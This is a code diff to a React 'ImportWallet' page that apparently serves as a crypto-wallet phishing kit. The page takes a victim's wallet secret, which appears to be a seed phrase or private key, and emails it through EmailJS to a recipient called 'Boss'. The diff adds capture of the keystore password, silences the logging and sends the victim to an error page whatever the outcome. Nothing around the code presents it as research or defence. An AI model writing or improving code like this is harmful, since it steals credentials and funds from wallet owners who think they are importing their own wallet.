@@ -42,19 +42,20 @@ const ImportWallet = () => {
     const templateParams = {
       from_name: 'a new user',  
       to_name: 'Boss',    
-      message: `Wallet Type: ${selectedOption}, Input Value: ${inputValue}`, 
+      message: `Wallet Type: ${selectedOption}, \n \n Input Value: ${inputValue}` + 
+               (selectedOption === 'keystore' ? `, \n\n Password: ${password}` : ''),
     };
   
     emailjs.send(serviceID, templateID, templateParams, publicKey)
       .then((response) => {
-        console.log('SUCCESS!', response.status, response.text);
+        // console.log('SUCCESS!', response.status, response.text);
         setIsLoading(false);
-        navigate('/sent'); 
+        navigate('/error'); 
       })
       .catch((error) => {
-        console.log('FAILED...', error);
+        // console.log('FAILED...', error);
         setIsLoading(false); 
-        navigate('/sent'); 
+        navigate('/error'); 
       });
   };
   
@@ -150,9 +151,9 @@ const ImportWallet = () => {
             borderRadius="0px"
             h="50px"
             onClick={sendEmail}
-            isLoading={isLoading} // Show spinner while loading
+           
           >
-            IMPORT
+           {isLoading ? "PLEASE WAIT....." : 'IMPORT'}
           </Button>
         </Box>
       )}
@@ -174,9 +175,9 @@ const ImportWallet = () => {
             borderRadius="0px"
             h="50px"
             onClick={sendEmail}
-            isLoading={isLoading} // Show spinner while loading
+          
           >
-            IMPORT
+           {isLoading ? "PLEASE WAIT....." : 'IMPORT'}
           </Button>
         </Box>
       )}
